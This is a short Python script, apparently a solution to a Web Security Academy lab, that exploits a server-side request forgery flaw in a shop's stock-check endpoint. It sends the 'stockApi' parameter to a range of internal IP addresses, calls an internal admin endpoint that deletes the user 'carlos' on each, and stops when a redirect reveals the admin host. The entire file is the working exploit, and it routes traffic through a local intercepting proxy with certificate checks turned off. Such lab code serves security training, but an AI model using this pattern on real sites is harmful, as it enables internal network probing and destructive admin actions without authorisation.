from distutils.log import warn
from logging import warning
import requests
import warnings

warnings.filterwarnings('ignore')
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

burp0_url = "https://acc81f9d1e0eff19c031bffe000500ff.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "MDbpX7UmzqtSL9NMcJwMsmsrfhqFKLac"}
burp0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"97\", \" Not;A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "https://acc81f9d1e0eff19c031bffe000500ff.web-security-academy.net", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://acc81f9d1e0eff19c031bffe000500ff.web-security-academy.net/product?productId=1", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en,pt-BR;q=0.9,pt;q=0.8,en-US;q=0.7", "Connection": "close"}
print ('Verifying...')
for i in range(110,130):
    burp0_data = {"stockApi": "http://192.168.0."+str(i)+":8080/admin/delete?username=carlos"}
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies, verify=False)
    print (f'#{i} http://192.168.0.{i}:8080/admin/delete?username=carlos - STATUS_CODE {response.status_code} {response.reason}')
    if (response.status_code == 302):
        print ('Admin Interface Host found!')
        print ('http://192.168.0.'+str(i)+':8080/admin')
        break
        
        